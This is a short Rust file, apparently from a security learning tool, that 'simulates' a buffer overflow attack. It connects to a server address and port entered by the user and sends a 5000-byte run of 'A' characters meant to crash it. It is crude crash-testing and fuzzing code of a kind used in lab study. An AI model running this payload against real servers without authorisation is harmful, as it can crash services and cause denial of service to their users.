use std::io::{self, Write};
use std::net::TcpStream;

pub fn overflow_server() {
    println!("Simulating buffer overflow attack...");

    // Prompt for server address
    print!("Enter the server address (e.g., 127.0.0.1): ");
    io::stdout().flush().unwrap();
    let mut server_address = String::new();
    io::stdin().read_line(&mut server_address).unwrap();
    let server_address = server_address.trim();

    // Prompt for server port
    print!("Enter the server port (e.g., 9999): ");
    io::stdout().flush().unwrap();
    let mut port = String::new();
    io::stdin().read_line(&mut port).unwrap();
    let port = match port.trim().parse::<u16>() {
        Ok(p) if (1..=65535).contains(&p) => p,
        _ => {
            eprintln!("Invalid port. Please enter a valid number between 1 and 65535.");
            return;
        }
    };

    // Connect to the server
    let server = format!("{}:{}", server_address, port);
    match TcpStream::connect(&server) {
        Ok(mut stream) => {
            println!("[+] Connected to the server at {}", server);

            // Construct a crashing payload
            let payload = "A".repeat(5000); // A payload larger than the buffer

            // Send the payload
            println!("[+] Sending payload of {} bytes...", payload.len());
            if let Err(e) = stream.write_all(payload.as_bytes()) {
                eprintln!("[-] Failed to send payload: {}", e);
                return;
            }

            println!("[+] Payload sent. Check the server for crashes.");
        }
        Err(e) => {
            eprintln!("[-] Failed to connect to the server: {}", e);
        }
    }
}
